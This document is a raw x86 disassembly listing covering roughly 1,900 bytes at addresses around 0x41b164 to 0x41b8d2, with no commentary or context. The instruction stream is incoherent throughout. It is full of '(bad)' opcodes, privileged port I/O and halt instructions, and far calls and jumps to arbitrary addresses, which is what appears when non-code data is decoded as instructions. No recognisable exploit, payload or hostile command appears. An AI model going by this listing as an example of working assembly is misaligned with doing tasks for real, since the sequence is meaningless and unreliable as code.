  41b164:	outs   dx,DWORD PTR ds:[esi]
  41b165:	mov    esp,0xc567896b
  41b16a:	xchg   cl,ch
  41b16c:	fucomip st,st(5)
  41b16e:	jl     0x41b1a5
  41b170:	jmp    0xc9561de8
  41b175:	(bad)  
  41b176:	push   eax
  41b177:	fldcw  WORD PTR [eax]
  41b179:	lea    cx,[bx+di]
  41b17d:	jmp    0x87135272
  41b182:	inc    edx
  41b183:	es aaa 
  41b185:	fcom   QWORD PTR [eax]
  41b187:	mov    ecx,0xc3f26d65
  41b18c:	hlt    
  41b18d:	or     BYTE PTR [ebx+0x132c7a4a],0x63
  41b194:	sub    esp,DWORD PTR [esi+0x2c]
  41b197:	lock xchg esp,eax
  41b199:	out    0x8c,eax
  41b19b:	pop    edx
  41b19c:	(bad)  
  41b19d:	mov    bh,0xa4
  41b19f:	push   es
  41b1a0:	mov    eax,0x640a1aa7
  41b1a5:	mov    eax,ds:0xf40058ac
  41b1aa:	aas    
  41b1ab:	(bad)  
  41b1ac:	xchg   ebx,eax
  41b1ad:	dec    ecx
  41b1ae:	out    0xa6,al
  41b1b0:	pop    ebp
  41b1b1:	sub    DWORD PTR [esi],edx
  41b1b3:	fsub   QWORD PTR [ebp-0x6215ded4]
  41b1b9:	dec    edx
  41b1ba:	add    esp,DWORD PTR [ebx+0x68]
  41b1bd:	jb     0x41b180
  41b1bf:	mov    ebp,0xe8454a3c
  41b1c4:	dec    ebx
  41b1c5:	or     bl,BYTE PTR [edx]
  41b1c7:	dec    ebx
  41b1c8:	mov    esi,0xbfa25fc5
  41b1cd:	das    
  41b1ce:	out    0x6d,eax
  41b1d0:	mov    ebx,DWORD PTR [ebp-0x10a5940b]
  41b1d6:	push   esp
  41b1d7:	push   edx
  41b1d8:	nop
  41b1d9:	or     eax,0xe581ea80
  41b1de:	and    eax,0xeb50366e
  41b1e3:	sub    BYTE PTR [eax-0x152258eb],0x34
  41b1ea:	xchg   ecx,eax
  41b1eb:	cmc    
  41b1ec:	in     al,dx
  41b1ed:	sbb    al,0x39
  41b1ef:	rcr    ah,cl
  41b1f1:	aas    
  41b1f2:	loop   0x41b263
  41b1f4:	ret    
  41b1f5:	repnz or eax,0x2ad43625
  41b1fb:	(bad)  
  41b1fc:	jp     0x41b1ab
  41b1fe:	sub    bh,BYTE PTR fs:[ecx]
  41b201:	xchg   esi,eax
  41b202:	cmp    esi,edi
  41b204:	jbe    0x41b204
  41b206:	sub    eax,esi
  41b208:	dec    edi
  41b209:	inc    ebp
  41b20a:	mov    ds:0x5c01eb34,al
  41b20f:	cmp    DWORD PTR [eax],0x97f8a8eb
  41b215:	jle    0x41b1cd
  41b217:	xor    DWORD PTR [eax-0x9],eax
  41b21a:	mov    ds:0x9a3f57d6,al
  41b21f:	push   ss
  41b220:	shl    edi,0x93
  41b223:	xor    eax,0xf8274596
  41b228:	jge    0x41b1c8
  41b22a:	mov    al,0xfa
  41b22c:	lahf   
  41b22d:	mov    ah,0x8b
  41b22f:	ja     0x41b1e7
  41b231:	pop    esi
  41b232:	jp     0x907e4187
  41b238:	mov    cl,0x1f
  41b23a:	in     al,0x2a
  41b23c:	cmp    BYTE PTR [edi+eiz*1+0x1f],0x36
  41b241:	(bad)  
  41b242:	mov    bh,BYTE PTR es:[ecx-0x36dd0afc]
  41b249:	stos   BYTE PTR es:[edi],al
  41b24a:	xor    al,0xe8
  41b24c:	lahf   
  41b24d:	push   ecx
  41b24e:	adc    DWORD PTR [esi],edx
  41b250:	fs fwait
  41b252:	mov    ecx,0x85c40a77
  41b257:	or     BYTE PTR [edx],cl
  41b259:	and    eax,edi
  41b25b:	hlt    
  41b25c:	cmp    BYTE PTR [esi-0x786cac23],dl
  41b262:	in     eax,dx
  41b263:	(bad)  
  41b264:	mov    ch,0x49
  41b266:	pop    eax
  41b267:	mul    DWORD PTR [esi]
  41b269:	mov    BYTE PTR [eax+0x53edf5e6],cl
  41b26f:	sbb    BYTE PTR [eax+0x20],0x5c
  41b273:	pop    ebx
  41b274:	jecxz  0x41b25e
  41b276:	mov    dh,0xd
  41b278:	icebp  
  41b279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b27a:	sbb    edi,esi
  41b27c:	cmp    al,0xdb
  41b27e:	pop    edi
  41b27f:	mov    ebp,DWORD PTR ds:0x5b0ca61c
  41b285:	imul   ecx,DWORD PTR [esi-0x7efcb0c4],0xffffff98
  41b28c:	cmp    ah,BYTE PTR [esi-0x666b1d49]
  41b292:	(bad)  
  41b293:	mov    DWORD PTR [edi+ebx*4-0x5b],esp
  41b297:	sbb    al,0x6f
  41b299:	xchg   esi,eax
  41b29a:	mov    ds:0xfea504c2,al
  41b29f:	mov    ds,WORD PTR [edi+ebp*2]
  41b2a2:	adc    eax,0xdbdc6517
  41b2a7:	call   0x3cd7:0x24d9db61
  41b2ae:	add    eax,0xaa31e44
  41b2b3:	mul    BYTE PTR [ebx]
  41b2b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2b6:	(bad)  
  41b2b7:	stos   DWORD PTR es:[edi],eax
  41b2b8:	push   0x68
  41b2ba:	lock pop ebp
  41b2bc:	mov    bl,0x21
  41b2be:	xor    BYTE PTR ds:0xc7c59fce,0xeb
  41b2c5:	arpl   WORD PTR [esi+0x87045c8],bx
  41b2cb:	ins    BYTE PTR es:[edi],dx
  41b2cc:	cmp    bl,dl
  41b2ce:	imul   edx,ebp,0x7ae283e8
  41b2d4:	jge    0x41b2c6
  41b2d6:	sbb    DWORD PTR [edx-0x5f],ebx
  41b2d9:	jg     0x41b358
  41b2db:	and    dh,0x81
  41b2de:	sbb    eax,0xdd833ad6
  41b2e3:	bound  ebp,QWORD PTR [ecx]
  41b2e5:	daa    
  41b2e6:	push   esp
  41b2e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2e8:	sub    bh,bl
  41b2ea:	cmp    eax,0xf5e40144
  41b2ef:	pop    ds
  41b2f0:	xor    ebp,esp
  41b2f2:	adc    ebx,DWORD PTR [ebx]
  41b2f4:	jg     0x41b2db
  41b2f6:	outs   dx,BYTE PTR ds:[esi]
  41b2f7:	add    esi,DWORD PTR [edx-0x57]
  41b2fa:	imul   ebp,DWORD PTR [ebx],0x9b374722
  41b300:	or     al,BYTE PTR [ecx+0x2586d63b]
  41b306:	out    0x62,al
  41b308:	xchg   edx,eax
  41b309:	fidivr WORD PTR [esi]
  41b30b:	test   DWORD PTR [edx-0x26],ecx
  41b30e:	fild   QWORD PTR [edi+edx*2-0x4bf8cd46]
  41b315:	cs inc edx
  41b317:	push   0x5335fdb
  41b31c:	(bad)  
  41b31d:	gs jecxz 0x41b307
  41b320:	push   ds
  41b321:	xchg   esp,eax
  41b322:	aas    
  41b323:	cmp    DWORD PTR [ebx+0x975482],eax
  41b329:	add    bl,cl
  41b32b:	push   edi
  41b32c:	rol    DWORD PTR [edx-0x32],1
  41b32f:	mov    ch,0xcf
  41b331:	in     eax,0x40
  41b333:	pop    eax
  41b334:	nop
  41b335:	mov    dl,0xd0
  41b337:	jp     0x41b31f
  41b339:	(bad)  
  41b33b:	or     al,0x1
  41b33d:	scas   al,BYTE PTR es:[edi]
  41b33e:	jle    0x41b348
  41b340:	(bad)  
  41b341:	push   DWORD PTR [esi+esi*8+0x1d]
  41b345:	cmp    edx,ecx
  41b347:	sub    BYTE PTR [edi-0x7142adf0],cl
  41b34d:	push   esi
  41b34e:	scas   eax,DWORD PTR es:[edi]
  41b34f:	jb     0x41b37d
  41b351:	xchg   edx,eax
  41b352:	jge    0x41b36d
  41b354:	mov    eax,edi
  41b356:	ds clc 
  41b358:	pop    ebp
  41b359:	xor    eax,DWORD PTR [ebp-0x1b4cc34c]
  41b35f:	rcl    BYTE PTR ds:[ebx+esi*2],cl
  41b363:	cdq    
  41b364:	mov    eax,ds:0x46bcd892
  41b369:	push   ecx
  41b36a:	shl    esi,1
  41b36c:	pop    ebx
  41b36d:	sar    DWORD PTR [eax],cl
  41b36f:	xor    bl,BYTE PTR [ecx+eiz*4]
  41b372:	push   eax
  41b373:	mov    esp,0x7f5e233
  41b378:	cdq    
  41b379:	ins    BYTE PTR es:[edi],dx
  41b37a:	loopne 0x41b394
  41b37c:	call   0xea6a77ef
  41b381:	pushf  
  41b382:	pop    ebp
  41b383:	shl    BYTE PTR [edi],cl
  41b385:	pop    eax
  41b386:	cmp    BYTE PTR [edx],0x91
  41b389:	arpl   WORD PTR [ebx],dx
  41b38b:	xchg   DWORD PTR [edx],edi
  41b38d:	lock sub ah,ch
  41b390:	xchg   DWORD PTR [eax-0x43],ebp
  41b393:	int3   
  41b394:	mov    cl,0x5
  41b396:	push   esp
  41b397:	or     DWORD PTR [ecx],edx
  41b399:	and    cl,bl
  41b39b:	inc    edx
  41b39c:	fild   WORD PTR [edi-0x21]
  41b39f:	add    esp,DWORD PTR [ebx+edi*2-0x31a90027]
  41b3a6:	enter  0xcb8d,0x51
  41b3aa:	fldcw  WORD PTR [edi]
  41b3ac:	push   esp
  41b3ad:	out    0x5d,al
  41b3af:	test   al,0x5c
  41b3b1:	hlt    
  41b3b2:	push   ds
  41b3b3:	cmc    
  41b3b4:	pop    eax
  41b3b5:	fldcw  WORD PTR [ebx+0x30f60e58]
  41b3bb:	add    eax,0x3deda143
  41b3c0:	mov    esi,0x6599a4ac
  41b3c5:	add    BYTE PTR [edi-0x23],dl
  41b3c8:	adc    ebp,DWORD PTR [eax]
  41b3ca:	in     al,dx
  41b3cb:	(bad)  
  41b3cc:	jmp    0x3213:0xadbbbeaa
  41b3d3:	imul   ecx,DWORD PTR [edx-0x47],0xfffffffa
  41b3d7:	adc    DWORD PTR [eax+0x13],esi
  41b3da:	lods   eax,DWORD PTR ds:[esi]
  41b3db:	and    dh,ch
  41b3dd:	mov    ebx,0xde454a56
  41b3e2:	mov    ecx,0xa8cbb338
  41b3e7:	punpcklqdq xmm2,XMMWORD PTR [edx]
  41b3eb:	adc    DWORD PTR [ebx+0x3b],ebx
  41b3ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ef:	mov    ds,WORD PTR [edi+0x26]
  41b3f2:	pop    edi
  41b3f3:	mov    edx,0x555f5f10
  41b3f8:	repnz or BYTE PTR ds:0x5adfbfed,dh
  41b3ff:	sub    dl,BYTE PTR [edx-0x5a]
  41b402:	mov    ebp,0xbe3bd5f
  41b407:	addr16 push edi
  41b409:	fidiv  WORD PTR [ebp-0x73]
  41b40c:	mul    DWORD PTR [eax+0x5228a5e4]
  41b412:	lods   ax,WORD PTR ds:[esi]
  41b414:	pop    edx
  41b415:	daa    
  41b416:	xchg   esi,eax
  41b417:	jg     0x41b422
  41b419:	hlt    
  41b41a:	aam    0x57
  41b41c:	xor    ebp,DWORD PTR [eax]
  41b41e:	xchg   esp,eax
  41b41f:	inc    edx
  41b420:	mov    ds:0x1d21bcc4,al
  41b425:	daa    
  41b426:	es mov al,0x5
  41b429:	cmp    BYTE PTR [edi+0x4],ch
  41b42c:	clc    
  41b42d:	jg     0x41b444
  41b42f:	push   ss
  41b430:	sub    BYTE PTR [eax],bh
  41b432:	push   ss
  41b433:	sub    eax,0x1904831c
  41b438:	popf   
  41b439:	push   0xffffffa1
  41b43b:	mov    bh,0xa9
  41b43d:	pop    edx
  41b43e:	mov    esp,0x236bd0cf
  41b443:	inc    esi
  41b444:	fyl2x  
  41b446:	xor    DWORD PTR [edi+0x3938ae1b],0xd3f7dcf3
  41b450:	imul   edx,DWORD PTR [ebx+0x2813291],0xf0b41c3f
  41b45a:	cmp    dh,BYTE PTR [edi+0x2c]
  41b45d:	cmp    ebp,esi
  41b45f:	dec    eax
  41b460:	cmp    dl,BYTE PTR [edx-0x3a1eba7d]
  41b466:	sub    DWORD PTR [ecx-0x78],0xffffffe1
  41b46a:	out    0xa5,eax
  41b46c:	pop    esi
  41b46d:	xchg   ecx,eax
  41b46e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b46f:	sbb    cl,BYTE PTR [ebp+0x35]
  41b472:	lds    edi,FWORD PTR [eax+0x44]
  41b475:	outs   dx,DWORD PTR ds:[esi]
  41b476:	sbb    ebp,DWORD PTR [esi-0x3b]
  41b479:	lods   al,BYTE PTR ds:[esi]
  41b47a:	rcl    DWORD PTR [edi-0x62bb1fd9],0x14
  41b481:	retf   
  41b482:	mov    dh,0x97
  41b484:	es sbb esi,ebx
  41b487:	mov    al,ds:0x7a0f01d7
  41b48c:	aaa    
  41b48d:	push   eax
  41b48e:	in     eax,0xd0
  41b490:	test   al,0x78
  41b492:	fisubr DWORD PTR [ecx+ebp*1]
  41b495:	loop   0x41b423
  41b497:	dec    ebx
  41b498:	adc    al,ch
  41b49a:	lock adc DWORD PTR [ebp+0x5c],0x39
  41b49f:	cmp    eax,0x19ac88af
  41b4a4:	pop    ss
  41b4a5:	jmp    0xc41dc2a6
  41b4aa:	mov    WORD PTR [ecx+0x4e333e60],gs
  41b4b0:	jp     0x41b4ea
  41b4b2:	clc    
  41b4b3:	(bad)  
  41b4b4:	pop    ss
  41b4b5:	xor    al,0x8f
  41b4b7:	shl    DWORD PTR [ebp-0x3a],0x5b
  41b4bb:	js     0x41b478
  41b4bd:	inc    edx
  41b4be:	mov    dh,0x7f
  41b4c0:	sub    ch,al
  41b4c2:	cdq    
  41b4c3:	or     esp,esi
  41b4c5:	jl     0x41b452
  41b4c7:	sbb    ch,BYTE PTR [ebx+ecx*8-0x66]
  41b4cb:	sub    esi,esp
  41b4cd:	fld    TBYTE PTR [ebx+0x6f]
  41b4d0:	jae    0x41b453
  41b4d2:	push   0xd
  41b4d4:	shl    BYTE PTR [esi+0x6cf1ff1d],cl
  41b4da:	test   BYTE PTR [esp+ebx*2+0x552a609e],0xa3
  41b4e2:	dec    ebx
  41b4e3:	xchg   esp,eax
  41b4e4:	dec    ebx
  41b4e5:	shr    DWORD PTR cs:[edi+0x6],cl
  41b4e9:	jmp    0x3426:0x40a3456e
  41b4f0:	repz imul BYTE PTR [ebx]
  41b4f3:	jne    0x41b549
  41b4f5:	pushw  ds
  41b4f7:	jo     0x41b507
  41b4f9:	js     0x41b4a1
  41b4fb:	jp     0x41b52c
  41b4fd:	pop    ecx
  41b4fe:	call   0x5718:0xb1298f13
  41b505:	out    0x94,al
  41b507:	pop    ss
  41b508:	xchg   esi,eax
  41b509:	sar    DWORD PTR [eax],0xdb
  41b50c:	call   0x6b8f095c
  41b511:	into   
  41b512:	(bad)  
  41b513:	xor    BYTE PTR [eax],dh
  41b515:	outs   dx,BYTE PTR ds:[esi]
  41b516:	aaa    
  41b517:	pop    ebp
  41b518:	stos   BYTE PTR es:[edi],al
  41b519:	mov    bh,0x84
  41b51b:	ret    
  41b51c:	xor    bl,BYTE PTR [ebp+0x5f]
  41b51f:	call   0xb99b:0x9db98b68
  41b526:	ins    DWORD PTR es:[edi],dx
  41b527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b528:	test   eax,0x37b344df
  41b52d:	mov    esi,0x820b6896
  41b532:	mov    ebp,0x20d705ba
  41b537:	cmp    ebp,edx
  41b539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b53a:	aad    0x44
  41b53c:	sbb    BYTE PTR cs:[ebx+0x57],0x97
  41b541:	popf   
  41b542:	jo     0x41b5ad
  41b544:	jle    0x41b5ab
  41b546:	add    eax,0x91c9101a
  41b54b:	pop    esp
  41b54c:	pop    ecx
  41b54d:	pusha  
  41b54e:	fwait
  41b54f:	icebp  
  41b550:	rcr    BYTE PTR [edx],cl
  41b552:	leave  
  41b553:	sbb    al,BYTE PTR [ebx]
  41b555:	mov    ds:0x6f5ed7a0,al
  41b55a:	mov    ebx,0x31fb25b0
  41b55f:	and    edx,DWORD PTR [ebx]
  41b561:	mov    edx,DWORD PTR [edx-0x6f98cffa]
  41b567:	mov    BYTE PTR [esi-0x76490ec1],al
  41b56d:	xchg   ebp,eax
  41b56e:	loope  0x41b532
  41b570:	jmp    0x41b5d6
  41b572:	push   ss
  41b573:	jae    0x41b5a8
  41b575:	push   cs
  41b576:	sbb    eax,0xa91627ca
  41b57b:	push   edi
  41b57c:	add    BYTE PTR [ebx+0x1a],bh
  41b57f:	hlt    
  41b580:	and    BYTE PTR [ecx],cl
  41b582:	jb     0x41b54d
  41b584:	xor    DWORD PTR [edi],edx
  41b586:	outs   dx,DWORD PTR ds:[esi]
  41b587:	adc    eax,0x2ad60f7
  41b58c:	shr    DWORD PTR [eax],0x3a
  41b58f:	(bad)  
  41b590:	push   eax
  41b591:	mov    ds:0x3abd9e1f,al
  41b596:	pop    eax
  41b597:	jno    0x41b606
  41b599:	ret    
  41b59a:	xlat   BYTE PTR ds:[ebx]
  41b59b:	jo     0x41b5b8
  41b59d:	adc    esi,DWORD PTR [ebx-0x7d04c91d]
  41b5a3:	sti    
  41b5a4:	mov    cl,0xc6
  41b5a6:	out    0xc8,al
  41b5a8:	dec    edi
  41b5a9:	test   al,0x19
  41b5ab:	xchg   BYTE PTR [eax-0x1],bl
  41b5ae:	mov    ch,0xa4
  41b5b0:	daa    
  41b5b1:	sbb    esi,0x69
  41b5b4:	push   0xa7e80d3f
  41b5b9:	inc    edx
  41b5ba:	mov    bh,0xf4
  41b5bc:	adc    BYTE PTR [ebp-0x233c5237],dh
  41b5c2:	fwait
  41b5c3:	mov    dh,0x1d
  41b5c5:	repz dec ebx
  41b5c7:	neg    DWORD PTR [ecx+0x42]
  41b5ca:	mov    al,ds:0xb05446fd
  41b5cf:	rcr    BYTE PTR [ebx],cl
  41b5d1:	dec    ecx
  41b5d2:	and    al,0x6a
  41b5d4:	sbb    BYTE PTR [ebx],bl
  41b5d6:	retf   
  41b5d7:	jge    0x41b56b
  41b5d9:	scas   eax,DWORD PTR es:[edi]
  41b5da:	sub    BYTE PTR fs:[esi-0x5b],0x81
  41b5df:	sbb    DWORD PTR [esi+0x72],esp
  41b5e2:	mov    cs,WORD PTR [ebp-0x4e7c60f7]
  41b5e8:	mov    ds:0x9b5fa529,al
  41b5ed:	push   ebx
  41b5ee:	pushf  
  41b5ef:	mov    eax,ds:0xbe6fe347
  41b5f4:	jbe    0x41b5bf
  41b5f6:	xchg   ebx,eax
  41b5f7:	mov    ds:0xd1c80c9e,al
  41b5fc:	repz mov dh,BYTE PTR [ebp-0x4615b32e]
  41b603:	int3   
  41b604:	or     ah,BYTE PTR [edi]
  41b606:	jmp    0x41b61d
  41b608:	mov    al,0xd2
  41b60a:	aad    0x47
  41b60c:	cmp    ecx,DWORD PTR [ebp+0x4a01b9c9]
  41b612:	dec    esi
  41b613:	or     eax,0xb4bc166e
  41b618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b619:	or     al,0x44
  41b61b:	jle    0x41b671
  41b61d:	and    al,0x89
  41b61f:	out    0xa4,al
  41b621:	in     al,dx
  41b622:	push   ecx
  41b623:	sbb    al,al
  41b625:	mov    ebp,0xd332ce1a
  41b62a:	pop    ecx
  41b62b:	push   ebx
  41b62c:	loop   0x41b666
  41b62e:	call   0xe6df3d18
  41b633:	js     0x41b5e2
  41b635:	mov    ds:0x4dfc597f,eax
  41b63a:	cmp    edi,eax
  41b63c:	scas   eax,DWORD PTR es:[edi]
  41b63d:	inc    eax
  41b63e:	inc    edx
  41b63f:	shl    BYTE PTR [ebx-0x703cb4c1],0xda
  41b646:	pop    ebp
  41b647:	push   0xafb05cdb
  41b64c:	mov    ch,0x82
  41b64e:	aas    
  41b64f:	mov    edx,DWORD PTR [ecx+eax*1]
  41b652:	fmul   DWORD PTR [edx+0x3b]
  41b655:	xor    eax,DWORD PTR [ebp+0x44d2cce9]
  41b65b:	shl    DWORD PTR [edi-0x1c33b1b9],cl
  41b661:	xchg   ebp,eax
  41b662:	mov    ecx,0xc0598bd7
  41b667:	xchg   ebp,eax
  41b668:	out    dx,al
  41b669:	or     BYTE PTR [esi],0xcb
  41b66c:	sbb    al,0x60
  41b66e:	cmp    ch,BYTE PTR [edi]
  41b670:	ins    DWORD PTR es:[edi],dx
  41b671:	pop    ebp
  41b672:	add    eax,0xbae5f891
  41b677:	xor    DWORD PTR [ebx],0x4
  41b67a:	les    ecx,FWORD PTR [eax]
  41b67c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b67d:	xchg   ebp,eax
  41b67e:	xchg   ebp,eax
  41b67f:	clc    
  41b680:	mov    edx,0xdb6d6185
  41b685:	(bad)  
  41b686:	sbb    BYTE PTR [esi+ebx*2],dh
  41b689:	or     DWORD PTR [ebx+edi*4-0x3],edi
  41b68d:	ss push ds
  41b68f:	adc    esp,ebp
  41b691:	lods   al,BYTE PTR ds:[esi]
  41b692:	loope  0x41b6d9
  41b694:	out    dx,eax
  41b695:	fsub   DWORD PTR [ebp+0x66]
  41b698:	iret   
  41b699:	xchg   esp,eax
  41b69a:	xchg   esp,eax
  41b69b:	pop    es
  41b69c:	sbb    eax,0x23d3532
  41b6a1:	aad    0x98
  41b6a3:	mov    DWORD PTR [ecx+edi*8],ebx
  41b6a6:	push   es
  41b6a7:	pushf  
  41b6a8:	fisttp WORD PTR [ebp-0x7eb058b9]
  41b6ae:	in     eax,0x55
  41b6b0:	(bad)  [edx-0x35be11ff]
  41b6b6:	mov    eax,0x225c8e1c
  41b6bb:	inc    ebp
  41b6bc:	adc    BYTE PTR [edi],bh
  41b6be:	das    
  41b6bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6c0:	or     bh,BYTE PTR [ebx+0x6e]
  41b6c3:	push   edi
  41b6c4:	xor    DWORD PTR [esi+0x13678b2],0x7f9f750
  41b6ce:	jae    0x41b6be
  41b6d0:	jbe    0x41b69f
  41b6d2:	(bad)  
  41b6d3:	call   0xc93a:0x9595fdbe
  41b6da:	in     eax,0xba
  41b6dc:	adc    DWORD PTR cs:[ebx+ebx*2],ebp
  41b6e0:	outs   dx,BYTE PTR ds:[esi]
  41b6e1:	jle    0x41b6f1
  41b6e3:	pop    edx
  41b6e4:	inc    BYTE PTR [esi+0x5]
  41b6e7:	stos   DWORD PTR es:[edi],eax
  41b6e8:	stc    
  41b6e9:	out    dx,al
  41b6ea:	xchg   esp,eax
  41b6eb:	cmp    BYTE PTR [eax],al
  41b6ed:	adc    DWORD PTR [ecx+0x18],eax
  41b6f0:	cwde   
  41b6f1:	jb     0x41b6f1
  41b6f3:	cmp    DWORD PTR [ecx],0x74
  41b6f6:	jnp    0x41b741
  41b6f8:	push   ss
  41b6f9:	dec    esi
  41b6fa:	cwde   
  41b6fb:	mov    cl,0x9e
  41b6fd:	adc    al,0x73
  41b6ff:	jl     0x41b75d
  41b701:	adc    BYTE PTR [edx-0x68ed941],0xc8
  41b708:	imul   ecx,DWORD PTR [ecx+ecx*4+0x2f],0x8d0309fc
  41b710:	sbb    DWORD PTR [edx+0x8b2c9c1],ebx
  41b716:	int    0x3a
  41b718:	mov    edi,ecx
  41b71a:	sbb    eax,0xbb786bb7
  41b71f:	gs or  al,0x6a
  41b722:	sbb    al,0x21
  41b724:	pusha  
  41b725:	jp     0x41b78d
  41b727:	scas   al,BYTE PTR es:[edi]
  41b728:	ins    BYTE PTR es:[edi],dx
  41b729:	add    ebx,esp
  41b72b:	lods   eax,DWORD PTR ds:[esi]
  41b72c:	mov    edx,0xedbb1d86
  41b731:	fstp   DWORD PTR [ecx]
  41b733:	gs scas eax,DWORD PTR es:[edi]
  41b735:	ss jbe 0x41b759
  41b738:	int3   
  41b739:	out    dx,eax
  41b73a:	push   es
  41b73b:	lods   al,BYTE PTR ds:[esi]
  41b73c:	hlt    
  41b73d:	add    DWORD PTR [edx-0x603033ad],ebp
  41b743:	xchg   esi,eax
  41b744:	xor    DWORD PTR [ebx-0xf],ebx
  41b747:	xor    eax,0x55cf1bb1
  41b74c:	mov    dh,0x69
  41b74e:	mov    esp,0x49eece84
  41b753:	rcr    BYTE PTR [ebp-0x1d],0xe0
  41b757:	iret   
  41b758:	xchg   edi,eax
  41b759:	or     bl,BYTE PTR [ebp-0x77]
  41b75c:	or     DWORD PTR [edx-0x6],ebp
  41b75f:	mov    ds:0x843d919f,eax
  41b764:	ins    BYTE PTR es:[edi],dx
  41b765:	mov    esi,0x5a6732bb
  41b76a:	lock xchg esp,eax
  41b76c:	or     esp,DWORD PTR [esi+0x15ac597a]
  41b772:	cmp    DWORD PTR [ecx+0x1b],esi
  41b775:	icebp  
  41b776:	mov    cl,BYTE PTR [edx+0x34a4b538]
  41b77c:	push   edx
  41b77d:	in     al,0x3f
  41b77f:	jle    0x41b799
  41b781:	xor    DWORD PTR [edx+0x56],esi
  41b784:	in     eax,dx
  41b785:	xchg   ecx,eax
  41b786:	cs push eax
  41b788:	adc    ah,BYTE PTR [eax+0x6a5b4fa8]
  41b78e:	cwde   
  41b78f:	retf   0x245a
  41b792:	arpl   WORD PTR ds:0x1d02c32d,bx
  41b798:	cmp    BYTE PTR [ebp-0x41],0x3
  41b79c:	mov    edi,0x5ee38db2
  41b7a1:	push   ds
  41b7a2:	outs   dx,BYTE PTR ds:[esi]
  41b7a3:	ja     0x41b7c9
  41b7a5:	mov    eax,ds:0x1233f3e
  41b7aa:	aam    0x30
  41b7ac:	(bad)
  41b7b0:	scas   al,BYTE PTR es:[edi]
  41b7b1:	mov    eax,ds:0x6b7265c3
  41b7b6:	inc    eax
  41b7b7:	jecxz  0x41b799
  41b7b9:	fmulp  st(5),st
  41b7bb:	dec    esp
  41b7bc:	push   ecx
  41b7bd:	push   eax
  41b7be:	mov    ch,0x6d
  41b7c0:	cmp    ebx,DWORD PTR [ebx-0x532eea74]
  41b7c6:	inc    ecx
  41b7c7:	dec    esi
  41b7c8:	sbb    BYTE PTR [edx],dl
  41b7ca:	out    dx,eax
  41b7cb:	cmp    ebx,edx
  41b7cd:	or     ecx,ecx
  41b7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7d0:	dec    ebx
  41b7d1:	jae    0x41b7e7
  41b7d3:	cmp    eax,0x5aa8252
  41b7d8:	fcmove st,st(4)
  41b7da:	sti    
  41b7db:	cmp    esp,ecx
  41b7dd:	out    0x14,eax
  41b7df:	lock int 0x6e
  41b7e2:	outs   dx,BYTE PTR ds:[esi]
  41b7e3:	test   eax,0xb7b083c8
  41b7e8:	mov    DWORD PTR [edi],0x8bce067
  41b7ee:	les    ebp,FWORD PTR [eax-0xd5adaf8]
  41b7f4:	call   0x311a:0x34cb4d78
  41b7fb:	push   ebx
  41b7fc:	push   edx
  41b7fd:	mov    dh,BYTE PTR [eax]
  41b7ff:	jae    0x41b7d5
  41b801:	lahf   
  41b802:	outs   dx,BYTE PTR ds:[esi]
  41b803:	mov    esp,0x2b123da2
  41b808:	in     al,dx
  41b809:	pop    eax
  41b80a:	inc    DWORD PTR ds:0xa161ae5b
  41b810:	out    dx,eax
  41b811:	fild   WORD PTR [eax+0x2b]
  41b814:	sbb    BYTE PTR [edx+0x60],cl
  41b817:	repnz or ebx,DWORD PTR [esi+0x483e5d31]
  41b81e:	xchg   ecx,eax
  41b81f:	ds icebp 
  41b821:	xchg   al,cl
  41b823:	xchg   ecx,eax
  41b824:	and    bh,BYTE PTR [ebx]
  41b826:	mov    ah,0xdc
  41b828:	push   esp
  41b829:	lods   eax,DWORD PTR ds:[esi]
  41b82a:	out    dx,eax
  41b82b:	push   0x3a446f4d
  41b830:	mov    ebx,0x3c8392e5
  41b835:	ss (bad) 
  41b837:	test   BYTE PTR [ebx],bh
  41b839:	jmp    0xbee6d7ff
  41b83e:	inc    edx
  41b83f:	ret    0x6152
  41b842:	or     bh,BYTE PTR [edx+eiz*2+0x1f]
  41b846:	js     0x41b8bd
  41b848:	push   edi
  41b849:	test   eax,0x9c9779d2
  41b84e:	fisubr WORD PTR [edx-0x55]
  41b851:	shl    ah,0x6a
  41b854:	cmp    DWORD PTR [ebx+0x6c],ebx
  41b857:	(bad)  
  41b858:	mov    esi,0xcfd96d5
  41b85d:	or     al,0x45
  41b85f:	xor    bl,BYTE PTR [edi+ebx*4-0x55ace93f]
  41b866:	icebp  
  41b867:	push   esp
  41b868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b869:	int3   
  41b86a:	sbb    eax,DWORD PTR [edi]
  41b86c:	xchg   DWORD PTR [esp+ecx*8],esi
  41b86f:	mov    bl,0xd9
  41b871:	repz data16 jo 0x41b855
  41b875:	xor    eax,0xdea35df8
  41b87a:	in     eax,dx
  41b87b:	loopne 0x41b8dc
  41b87d:	and    edx,DWORD PTR [edx+0x48a72127]
  41b883:	test   DWORD PTR [ecx],0x8912dce7
  41b889:	xchg   ebx,eax
  41b88a:	adc    ebx,DWORD PTR [bp+si-0x7454]
  41b88f:	stc    
  41b890:	sbb    al,0x38
  41b892:	cwde   
  41b893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b894:	push   ebp
  41b895:	mov    edx,0x79898658
  41b89a:	push   ss
  41b89b:	not    BYTE PTR [edx+0x5b]
  41b89e:	sub    bl,BYTE PTR [edi+0x4b8691e1]
  41b8a4:	mov    dh,0xcc
  41b8a6:	inc    ebx
  41b8a7:	mov    DWORD PTR [ebx+0x5f619d69],esp
  41b8ad:	ret    0xee69
  41b8b0:	mov    dl,0x7e
  41b8b2:	mov    ds:0xe7e2a249,eax
  41b8b7:	popaw  
  41b8b9:	popa   
  41b8ba:	mov    BYTE PTR [eax+eax*2+0x33be629],bl
  41b8c1:	bound  esp,QWORD PTR [esi+0x24]
  41b8c4:	data16 cmp BYTE PTR es:[eax],bl
  41b8c8:	sbb    al,0x62
  41b8ca:	dec    ebx
  41b8cb:	or     BYTE PTR [edi-0x7c7f24ea],0xfd
  41b8d2:	sbb    dh,ch
